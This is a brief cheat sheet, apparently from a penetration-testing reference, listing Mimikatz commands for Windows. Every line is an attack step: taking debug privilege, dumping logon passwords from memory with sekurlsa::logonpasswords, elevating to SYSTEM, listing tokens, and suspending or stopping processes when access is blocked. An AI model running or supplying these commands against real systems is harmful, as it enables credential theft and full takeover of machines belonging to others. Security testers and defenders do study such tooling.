Running Mimikatz
# Run as ADMINISTRATOR (most commands need it)
mimikatz.exe

# Or run specific command directly
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Check privileges
privilege::debug

# If debug fails, try:
process::suspend
process::stop

# Elevate to SYSTEM
token::elevate

# List tokens
token::list